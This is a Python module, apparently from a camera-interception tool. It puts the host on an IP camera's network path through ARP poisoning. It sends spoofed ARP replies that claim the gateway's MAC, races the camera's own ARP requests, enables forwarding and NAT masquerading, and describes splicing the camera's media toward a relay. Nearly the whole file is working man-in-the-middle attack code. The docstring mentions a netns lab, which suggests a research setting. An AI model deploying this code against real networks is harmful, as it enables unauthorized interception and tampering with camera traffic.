"""Getting on the camera's path (router mode)."""
import subprocess
import threading
import time
from pathlib import Path

from . import rawnet
from .netutil import ipt, route_get


class OnPath:
    """Make this host the camera's router: ARP-poison only the camera (we
    become its gateway) and MASQUERADE its traffic out under our address.

    Two-way poisoning (camera AND router) made the router route spoofed
    camera packets that it had also bridged from WiFi to our port with
    the identical 5-tuple; its fast path then sent them back to us with
    the camera's MAC (TTL -1 per bounce, a 25 us ping-pong) and kept doing
    so after the MITM stopped, black-holing that camera flow until the
    camera changed ports; the splice's own media came straight back
    instead of reaching the relay. In router mode the real router only
    ever routes our flows and its ARP table is untouched.

    The camera's existing flows survive the switch: the relays follow
    the new NAT mapping from its next keepalive, no reboot needed.

    poison=False skips the ARP step for hosts that already carry the
    camera's traffic (a gateway, or the netns lab)."""

    def __init__(self, cam_ip, iface, poison, gateway=None):
        self.cam_ip, self.iface, self.poison = cam_ip, iface, poison
        self.gateway = gateway or route_get("8.8.8.8").split(" via ")[1].split()[0]
        self.stop = threading.Event()
        self.undo = []

    def _sysctl(self, path, value):
        p = Path(path)
        old = p.read_text().strip()
        p.write_text(f"{value}\n")
        self.undo.append(lambda: p.write_text(old + "\n"))

    def start(self):
        self._sysctl("/proc/sys/net/ipv4/ip_forward", 1)
        for dev in ("all", self.iface):
            # forwarding out the interface the packet came in on would
            # send the camera ICMP redirects naming the real gateway
            self._sysctl(f"/proc/sys/net/ipv4/conf/{dev}/send_redirects", 0)
        rule = ("-t", "nat", "POSTROUTING", "-s", self.cam_ip, "-o",
                self.iface, "-j", "MASQUERADE")
        if ipt(rule[0], rule[1], "-C", *rule[2:]).returncode != 0:
            ipt(rule[0], rule[1], "-A", *rule[2:])
            self.undo.append(lambda: ipt(rule[0], rule[1], "-D", *rule[2:]))
        if self.poison:
            self._arp_start()
        print(f"[+] on-path: MASQUERADE {self.cam_ip} out {self.iface}"
              f"{', camera-only ARP poison' if self.poison else ''}")

    def _arp_start(self):
        me = rawnet.mac_bytes(rawnet.iface_mac(self.iface))
        cam_mac = rawnet.mac_bytes(self._mac(self.cam_ip))
        gw_mac = rawnet.mac_bytes(self._mac(self.gateway))
        # unicast to the camera only: "the gateway is at our MAC"
        lie = rawnet.arp_reply(me, cam_mac, self.gateway, me,
                               self.cam_ip, cam_mac)
        truth = rawnet.arp_reply(gw_mac, cam_mac, self.gateway, gw_mac,
                                 self.cam_ip, cam_mac)

        def send(frame):
            try:
                with rawnet.open_raw(self.iface) as s:
                    s.send(frame)
            except OSError as e:     # link down across suspend/resume
                print(f"[!] ARP send failed ({e})")

        def tick():
            while not self.stop.is_set():
                send(lie)
                self.stop.wait(1.0)

        def answer():
            # win the race when the camera asks for its gateway
            def cb(p):
                if p.op == 1 and p.spa == self.cam_ip and p.tpa == self.gateway:
                    send(lie)
            while not self.stop.is_set():
                try:
                    rawnet.sniff(self.iface, rawnet.arp_filter(),
                                 rawnet.parse_arp, cb, self.stop.is_set)
                except OSError as e:  # suspend/resume
                    print(f"[!] ARP responder error ({e}); retrying")
                    self.stop.wait(2)

        threading.Thread(target=tick, daemon=True).start()
        threading.Thread(target=answer, daemon=True).start()

        def restore():
            for _ in range(5):
                send(truth)
                time.sleep(0.3)
        self.undo.append(restore)

    def _mac(self, ip):
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True)
        out = subprocess.run(["ip", "neigh", "show", ip], capture_output=True,
                             text=True).stdout.split()
        if "lladdr" not in out:
            raise SystemExit(f"cannot resolve MAC for {ip}")
        return out[out.index("lladdr") + 1]

    def close(self):
        if self.stop.is_set():
            return
        self.stop.set()
        for fn in reversed(self.undo):
            try:
                fn()
            except Exception as e:  # noqa: BLE001
                print(f"[!] on-path cleanup step failed: {e}")
        print("[+] on-path mode off")
